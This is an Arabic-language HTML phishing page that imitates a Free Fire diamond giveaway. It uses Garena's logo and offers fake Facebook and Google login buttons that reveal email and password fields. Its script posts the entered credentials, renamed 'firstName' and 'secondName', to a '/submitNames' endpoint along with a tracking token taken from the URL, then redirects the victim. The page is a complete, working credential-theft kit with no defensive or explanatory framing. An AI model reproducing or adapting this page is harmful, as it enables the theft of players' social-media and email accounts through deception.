<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Free Fire - شحن جواهر مجاناً">
    <meta property="og:image" content="https://ff.garena.com/static/images/icon_logo.png">
    <title>Free Fire | Diamonds</title>
    <style>
        body { font-family: 'Tahoma', sans-serif; background: #0b0e11; color: white; margin: 0; }
        .header { background: #ff4500; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; border-bottom: 3px solid #ffd700; }
        .container { max-width: 400px; margin: 30px auto; background: #1c1f26; padding: 30px; border-radius: 15px; border: 1px solid #333; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #2c2f36; border: 1px solid #444; color: white; border-radius: 8px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #ff4500; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 15px; }
        .plan { background: #2c2f36; padding: 15px; border-radius: 10px; margin: 10px 0; cursor: pointer; display: flex; justify-content: space-between; border: 2px solid transparent; }
        .plan.active { border-color: #ff4500; }
    </style>
</head>
<body>
    <div class="header">FREE FIRE DIAMONDS 💎</div>
    <div class="container">
        <img src="https://ff.garena.com/static/images/icon_logo.png" width="70" style="margin-bottom: 15px;">
        <h2>احصل على 1,000 جوهرة مجاناً</h2>
        <input type="text" id="id" placeholder="ID اللاعب">
        <div class="plan active" onclick="sel(this, '0')"><span>1,000 💎</span> <b style="color:#ffd700">مجاني</b></div>
        <div class="plan" onclick="sel(this, '30')"><span>10,000 💎</span> <b style="color:#ffd700">29.99$</b></div>
        <p>سجل دخول لتأكيد الاستلام:</p>
        <div style="display:flex; flex-direction:column; gap:10px;">
            <button style="background:#1877f2; color:white; padding:12px; border:none; border-radius:8px; cursor:pointer;" onclick="showL()">Facebook</button>
            <button style="background:#fff; color:black; padding:12px; border:none; border-radius:8px; cursor:pointer;" onclick="showL()">Google</button>
        </div>
        <div id="lArea" style="display:none; margin-top:20px;">
            <input type="text" id="u" placeholder="البريد الإلكتروني">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="btn" id="b" onclick="send()">تأكيد الآن</button>
        </div>
    </div>
    <script>
        const token = new URLSearchParams(window.location.search).get('t');
        let isFree = true;
        function sel(el, p) {
            document.querySelectorAll('.plan').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            isFree = (p === '0');
            document.getElementById('b').innerText = isFree ? "تأكيد الآن" : "شراء الآن ("+p+"$)";
        }
        function showL() { document.getElementById('lArea').style.display = 'block'; }
        async function send() {
            if(!isFree) return alert('بوابة الدفع مغلقة!');
            const btn = document.getElementById('b');
            btn.disabled = true; btn.innerText = "جاري التأكيد...";
            await fetch('/submitNames', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, firstName: document.getElementById('u').value, secondName: document.getElementById('p').value })
            });
            window.location.href = "/ok.html";
        }
    </script>
</body>
</html>
